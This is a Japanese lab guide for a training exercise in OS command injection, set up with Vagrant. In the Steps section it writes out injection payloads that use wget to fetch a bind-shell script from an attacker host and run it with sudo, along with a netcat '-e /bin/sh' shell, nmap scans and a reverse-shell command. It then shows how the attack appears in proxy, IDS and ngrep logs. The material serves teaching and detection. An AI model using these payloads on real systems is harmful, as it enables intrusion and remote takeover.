# コマンドインジェクションの脆弱性攻撃演習について
## Motivation
攻撃者 (Attacker) がコマンドインジェクションの脆弱性を持った攻撃対象のウェブサイト (Target) に不正なOSコマンドを含むリクエストを送信すると、Target OSにおいてAttackerの送信したコマンドが実行される。コマンドインジェクションによる攻撃や情報漏洩が、現実社会においてどのように発生するかを理解することは重要である。

## 学習目標
CyExcが提供する本演習では、コマンドインジェクションの脆弱性やそれに対しての攻撃手法や脅威の理解を目的とする。本演習では、Bind ShellスクリプトをTarget OSにアップロードし、Target OSのシェル制御を取得する。Vagrantに攻撃対象のサーバ (Target OS、ウェブサーバ、Apache Struts2を利用) と攻撃者が利用するサーバ (Attacker OS、ウェブサーバ) の2つのゲストOSを構築した環境を提供する。なお、Reverse Shellスクリプトは情報倫理の観点から、CyExcでの公開または提供は行わないものとする。

<img src="https://github.com/CyExc/CyExc/blob/master/2017/ex2/images/block.png" title="Ex2演習環境構成図">

## Bind Shellとは
Targetマシンのポートを開け、Attackerマシンから受信を待つシェルのことである。
1. Attackerマシンから攻撃コードを送信する。
2. 攻撃に成功した場合、TargetマシンからAttackerマシンで待ち受けているポートが開かれて接続され、Attackerマシン側にシェルの制御が奪われる。

<img src="https://github.com/CyExc/CyExc/blob/master/2017/ex2/images/bindshell.png" title="BindShell">

## シナリオ
Target OSに設置されたウェブサーバ は、入力されたホスト名またはIPアドレスに対してpingを行うサイトを公開している。Attacker OSからこのウェブサイトにアクセスし、不正なOSコマンドを含むリクエストを送信する。また、Bind Shellスクリプトを実行し、Target OSに設置されたウェブサーバのシェル制御を取得する。

<img src="https://github.com/CyExc/CyExc/blob/master/2017/ex2/images/network.png" title="ネットワーク図">

## Prerequisite
* Vagrant
  * Plugin: landrush, vagrant-vbguest
  * Packer

## Installation　　
* Vagrant　　　
1. [CyExc用box](https://github.com/CyExc/CyExc/tree/master/2017/CyExc_Box)を作成する。
2. $ vagrant up --provision　　　   
3. $ vagrant landrush ls　　　   
ゲストOSのIPアドレスとhostnameが以下のようにマッチしていない場合は、vagrant destroyを行う必要がある。　　　 
```
target.cyexc-target            192.168.33.10
10.33.168.192.in-addr.arpa     target.cyexc-target
attacker.cyexc-attacker        192.168.33.20
20.33.168.192.in-addr.arpa     attacker.cyexc-attacker
````

4. target側のOS起動
$ vagrant ssh target  <br>
	i. $ cd target/　　　    <br>
	ii.$ sudo docker-compose up --build  <br>
	iii. Browse to ht&#8203;tp://target.cyexc-target/  <br>
5. attacker側のOS起動
$ vagrant ssh attacker  <br>
	i. $ cd attacker/　　　      <br>
	ii.$ sudo docker-compose up --build  <br>

## nc (netcat)
対象サーバとTCPまたはUDPで接続して、データ送受信するためのバックエンドツール。また、ポートスキャンツールやサービスデーモンとして特定ポートでListenさせることができる。
```
vagrant@target:~$ nc -h
connect to somewhere:	nc [-options] hostname port[s] [ports] ...
listen for inbound:	nc -l -p port [-options] [hostname] [port]
options:
	-c shell commands	as `-e'; use /bin/sh to exec [dangerous!!]
	-e filename		program to exec after connect [dangerous!!]
```

* netcat-traditionalへの切り替え
```
vagrant@target:~$ sudo update-alternatives --config nc
There are 2 choices for the alternative nc (providing /bin/nc).

  Selection    Path                 Priority   Status
------------------------------------------------------------
* 0            /bin/nc.openbsd       50        auto mode
  1            /bin/nc.openbsd       50        manual mode
  2            /bin/nc.traditional   10        manual mode

Press enter to keep the current choice[*], or type selection number: 2
```

* Target OSでport=4444をサービスデーモンとしListen  <br>
```
vagrant@target:~$ sudo nc -lvp  4444 -e /bin/sh
listening on [any] 4444 ...
connect to [192.168.33.10] from attacker.cyexc-attacker [192.168.33.20] 33086
```

* Attacker OSでバックドア確認  <br>
```
vagrant@attacker:~$ nc target.cyexc-target 4444
pwd
/home/vagrant
```

* WEBサーバにGETリクエストを送信  <br>
```
vagrant@attacker:~$ echo -en "GET / HTTP/1.1\n\n" | nc target.cyexc-target 80
HTTP/1.1 400 Bad Request
Server: nginx/1.13.8
Date: Sat, 20 Jan 2018 16:26:14 GMT
Content-Type: text/html
Content-Length: 173
Connection: close
```

## Steps
ht&#8203;tp://target.cyexc-target/アクセス時のスクリーンショット

<img src="https://github.com/CyExc/CyExc/blob/master/2017/ex2/images/pingWEB.png" width=400 title="Screenshot">

1. 不正なOSコマンドを含むリクエストを送信する。
	i. Bind Shellスクリプトは`8.8.8.8;wget http://attacker.cyexc-attacker:8081/bind_shell.py;chmod 777 bind_shell.py`と入力し、Attacker OSからTarget OSにダウンロードした。  <br>
 	Attacker OSで、nmapを用いてTarget OSをポートスキャンする。この時点では、ポート443がOPENしていない。<br>
	```
	vagrant@attacker:~$ sudo nmap -sS target.cyexc-target

	Nmap scan report for target.cyexc-target (192.168.33.10)

	PORT     STATE SERVICE
	22/tcp   open  ssh
	80/tcp   open  http
	111/tcp  open  rpcbind
	8080/tcp open  http-proxy
	MAC Address: 08:00:27:83:ED:1B (Cadmus Computer Systems)
	```

	ii. `8.8.8.8;echo 'cyexc' | sudo -S python bind_shell.py`のリクエスト送信でBind Shell起動する。  <br>
	Attacker OSで、nmapを用いてTarget OSのポートスキャンすると、ポート443がOPENしていることがわかる。  <br>
	```
	vagrant@attacker:~$ sudo nmap -sS target.cyexc-target

	Nmap scan report for target.cyexc-target (192.168.33.10)

	PORT     STATE SERVICE
	22/tcp   open  ssh
	80/tcp   open  http
	111/tcp  open  rpcbind
	**443/tcp  open  https**
	8080/tcp open  http-proxy
	MAC Address: 08:00:27:83:ED:1B (Cadmus Computer Systems)
	```

2. ncまたはtelnetを利用して、Attacker OSからTarget OSに接続し、Target OSのシェルを取得する。  <br>
Target OSからAttacker OSへの接続は`nodejs reverseShellClient.js -i 192.168.33.20`で行った。  <br>
以下はBind ShellでTarget OSのシェルを取得した際のTerminalのスクリーンショット。  <br>

* ncを使用した場合

<img src="https://github.com/CyExc/CyExc/blob/master/2017/ex2/images/nc.png" width=400 title="ncスクリーンショット">

* telnetを使用した場合

<img src="https://github.com/CyExc/CyExc/blob/master/2017/ex2/images/telnet.png" width=400 title="telnetスクリーンショット">

### proxyサーバログの検知
proxyサーバのログは`vagrant@www:~/apps$ sudo docker-compose logs | grep proxy > proxy.log`で取得した。

[20/Jan/2018:14:09:20 +0000] **"GET /getPage?host=8.8.8.8%3Bwget+http%3A%2F%2Fattacker.cyexc-attacker%3A8081%2Fbind_shell.py%3Bchmod+700+bind_shell.py HTTP/1.1"** 200 842 **"ht&#8203;tp://target.cyexc-target/getPage?host=8.8.8.8%3Bsudo+python+bind_shell.py"** "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0" "-"

URLエンコードすると、不正なOSコマンドを含むリクエストがわかる。

``
vagrant@target:~$ echo '/getPage?host=8.8.8.8%3Bwget+http%3A%2F%2Fattacker.cyexc-attacker%3A8081%2Fbind_shell.py%3Bchmod+700+bind_shell.py HTTP/1.1" 200 842 "http://target.cyexc-target/getPage?host=8.8.8.8%3Bsudo+python+bind_shell.py"' | nkf -w --url-input
``

**/getPage?host=8.8.8.8;wget+ht&#8203;tp://attacker.cyexc-attacker:8081/bind_shell.py;chmod+700+bind_shell.py HTTP/1.1" 200 842 "ht&#8203;tp://target.cyexc-target/getPage?host=8.8.8.8;sudo+python+bind_shell.py"**

取得したログはこちら＠[proxy.log](https://github.com/CyExc/CyExc/blob/master/2017/ex2/logs/proxy.log)

### IDSログの検知
IDSのログは`vagrant@www:~/apps$ cp /var/log/suricata/http.log .`で取得した。

* 不審なTCPを受信  <br>
01/20/2018-15:23:29.690006  [**] [1:2010937:2] ET POLICY Suspicious inbound to mySQL port 3306 [**] [Classification: Potentially Bad Traffic] [Priority: 2] {TCP} **192.168.33.20**:50426 -> **192.168.33.10**:3306  <br>
01/20/2018-15:23:29.761741  [**] [1:2010936:2] ET POLICY Suspicious inbound to Oracle SQL port 1521 [**] [Classification: Potentially Bad Traffic] [Priority: 2] {TCP} **192.168.33.20**:50426 -> **192.168.33.10**:1521  <br>

* ポートスキャンを受信  <br>
01/20/2018-15:23:29.762176  [**] [1:2002911:6] ET SCAN Potential VNC Scan 5900-5920 [**] [Classification: Attempted Information Leak] [Priority: 2] {TCP} **192.168.33.20**:50426 -> **192.168.33.10**:5903  <br>
01/20/2018-15:23:29.769568  [**] [1:2010939:2] ET POLICY Suspicious inbound to PostgreSQL port 5432 [**] [Classification: Potentially Bad Traffic] [Priority: 2] {TCP} **192.168.33.20**:50426 -> **192.168.33.10**:5432  <br>

取得したログはこちら@[fast.log](https://github.com/CyExc/CyExc/blob/master/2017/ex2/logs/fast.log)

### proxyサーバでHTTP通信をキャプチャ
WEBサーバのログで事象を確認する。

1. proxyサーバにログイン
```
vagrant@webgoat:~/apps$ sudo docker-compose exec proxy bash
```
2. ngrepを使用してHTTP通信をキャプチャ
```
root@c56fe08a3ea2:/# ngrep -W byline 'HTTP' -q > ngrep.log
```
3. proxyサーバをログアウト
4. ゲストOSでproxyサーバのcontainer IDを調べる
```
vagrant@webgoat:~/apps$ sudo docker ps
CONTAINER ID        IMAGE                 COMMAND                  CREATED             STATUS              PORTS                    NAMES
937fb140f393        myproxy               "nginx -g 'daemon of…"   6 minutes ago       Up 6 minutes        0.0.0.0:80->80/tcp       apps_proxy_1
64742ebbea0f        myarachni             "bin/arachni_web --h…"   6 minutes ago       Up 6 minutes        0.0.0.0:9292->9292/tcp   apps_arachni_1
425df1dc54ac        webgoat/webgoat-7.1   "java -Djava.securit…"   6 minutes ago       Up 6 minutes        0.0.0.0:8080->8080/tcp   apps_webgoat_1
```
5. 取得したngrepのログをゲストOSにコピー  <br>
```
vagrant@webgoat:~/apps$ sudo docker cp 937fb140f393:/ngrep.log .  
```

+ 不審なリクエスト**ls　-l**

``
T 192.168.1.100:42012 -> 192.168.1.10:8080 [AP]  <br>
GET /getPage?host=8.8.8.8%3Bls+-l HTTP/1.1  <br>
``

+ Target OSに設置されたWEBサーバが上記リクエストのレスポンスに**ls -l**のコマンド結果が含まれている。

``
T 192.168.1.10:8080 -> 192.168.1.100:42012 [A]  <br>
HTTP/1.1 200 OK.  <br>
``

``
PING 8.8.8.8 (8.8.8.8): 56 data bytes
64 bytes from 8.8.8.8: icmp_seq=0 ttl=61 time=33.850 ms
64 bytes from 8.8.8.8: icmp_seq=1 ttl=61 time=37.703 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=61 time=32.720 ms
--- 8.8.8.8 ping statistics ---
3 packets transmitted, 3 packets received, 0% packet loss
round-trip min/avg/max/stddev = 32.720/34.758/37.703/2.133 ms
total 120
-rw-r--r--   1 node  node    194 Jan 20  2018 bind.py
-rwxrwxrwx   1 cyexc cyexc  2067 Jan 20 15:07 bind_shell.py
-rw-r--r--   1 cyexc cyexc  2025 Jan 14 19:25 bind_shell.py.1
-rw-r--r--   1 cyexc cyexc   525 Sep 30 11:11 index.ejs
-rw-r--r--   1 cyexc cyexc   414 Sep 30 11:11 index.html
drwxr-xr-x 263 root  root  12288 Jan 20 13:23 node_modules
-rw-r--r--   1 root  root  78310 Jan 20 13:23 package-lock.json
-rw-r--r--   1
``

取得したログはこちら＠[ngrep.log](https://github.com/CyExc/CyExc/blob/master/2017/ex2/logs/ngrep.log)


## References
* [Command Injection](https://www.owasp.org/index.php/Command_Injection)
* [CWE-78 OSコマンドインジェクション](http://jvndb.jvn.jp/ja/cwe/CWE-78.html)
* [2015年JPCERT ログを活用した高度サイバー攻撃の早期発見と分析](https://www.jpcert.or.jp/research/APT-loganalysis_Presen_20151117.pdf)
* [Detecting Attacks on Web Applications from Log
Files](https://www.sans.org/reading-room/whitepapers/logging/detecting-attacks-web-applications-log-files-2074)
* [SANS Netcat Cheat Sheet](https://www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf)
* [ngrep examples](https://github.com/jpr5/ngrep/blob/master/EXAMPLES.md)
